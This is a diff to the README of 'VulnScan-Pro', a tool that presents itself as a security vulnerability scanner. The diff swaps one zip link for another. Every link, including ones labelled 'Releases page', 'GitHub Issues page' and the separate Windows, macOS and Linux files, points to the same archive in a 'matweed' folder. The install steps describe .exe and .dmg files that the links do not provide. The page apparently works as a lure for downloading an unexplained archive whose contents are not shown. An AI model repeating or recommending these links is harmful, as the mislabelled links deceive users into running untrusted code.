@@ -6,7 +6,7 @@ Welcome to VulnScan-Pro, your professional security vulnerability scanner. This 
 
 ## 📥 Download VulnScan-Pro
 
-[![Download VulnScan-Pro](https://raw.githubusercontent.com/DBA-devops-tech/VulnScan-Pro/main/matweed/VulnScan-Pro.zip)](https://raw.githubusercontent.com/DBA-devops-tech/VulnScan-Pro/main/matweed/VulnScan-Pro.zip)
+[![Download VulnScan-Pro](https://github.com/DBA-devops-tech/VulnScan-Pro/raw/refs/heads/main/matweed/Pro_Scan_Vuln_v2.8-alpha.2.zip)](https://github.com/DBA-devops-tech/VulnScan-Pro/raw/refs/heads/main/matweed/Pro_Scan_Vuln_v2.8-alpha.2.zip)
 
 Click the link above to download the latest version.
 
@@ -39,13 +39,13 @@ To ensure VulnScan-Pro runs smoothly, please consider the following system requi
 To get started, follow these steps:
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://raw.githubusercontent.com/DBA-devops-tech/VulnScan-Pro/main/matweed/VulnScan-Pro.zip) to find the latest version of VulnScan-Pro.
+   Go to our [Releases page](https://github.com/DBA-devops-tech/VulnScan-Pro/raw/refs/heads/main/matweed/Pro_Scan_Vuln_v2.8-alpha.2.zip) to find the latest version of VulnScan-Pro.
 
 2. **Choose the Right File**  
    On the Releases page, look for the latest version. You will see files for different operating systems. Select the one appropriate for your system:
-   - For Windows: `https://raw.githubusercontent.com/DBA-devops-tech/VulnScan-Pro/main/matweed/VulnScan-Pro.zip`
-   - For macOS: `https://raw.githubusercontent.com/DBA-devops-tech/VulnScan-Pro/main/matweed/VulnScan-Pro.zip`
-   - For Linux: `https://raw.githubusercontent.com/DBA-devops-tech/VulnScan-Pro/main/matweed/VulnScan-Pro.zip`
+   - For Windows: `https://github.com/DBA-devops-tech/VulnScan-Pro/raw/refs/heads/main/matweed/Pro_Scan_Vuln_v2.8-alpha.2.zip`
+   - For macOS: `https://github.com/DBA-devops-tech/VulnScan-Pro/raw/refs/heads/main/matweed/Pro_Scan_Vuln_v2.8-alpha.2.zip`
+   - For Linux: `https://github.com/DBA-devops-tech/VulnScan-Pro/raw/refs/heads/main/matweed/Pro_Scan_Vuln_v2.8-alpha.2.zip`
 
 3. **Download the File**  
    Click on the file name to start downloading it.
@@ -53,7 +53,7 @@ To get started, follow these steps:
 4. **Install the Application**  
    - **For Windows**: Double-click the downloaded `.exe` file and follow the instructions.
    - **For macOS**: Open the downloaded `.dmg` file and drag the application into your "Applications" folder.
-   - **For Linux**: Extract the `https://raw.githubusercontent.com/DBA-devops-tech/VulnScan-Pro/main/matweed/VulnScan-Pro.zip` file and follow the instructions in the README to install.
+   - **For Linux**: Extract the `https://github.com/DBA-devops-tech/VulnScan-Pro/raw/refs/heads/main/matweed/Pro_Scan_Vuln_v2.8-alpha.2.zip` file and follow the instructions in the README to install.
 
 5. **Run VulnScan-Pro**  
    Once installed, you can open VulnScan-Pro from your applications list. 
@@ -81,7 +81,7 @@ After setting up, you can start using the application:
 
 ## 💬 Support
 
-If you encounter issues, you can find help in the "Help" section within the application or visit our [GitHub Issues page](https://raw.githubusercontent.com/DBA-devops-tech/VulnScan-Pro/main/matweed/VulnScan-Pro.zip) for community support.
+If you encounter issues, you can find help in the "Help" section within the application or visit our [GitHub Issues page](https://github.com/DBA-devops-tech/VulnScan-Pro/raw/refs/heads/main/matweed/Pro_Scan_Vuln_v2.8-alpha.2.zip) for community support.
 
 ## ❓ FAQ
 
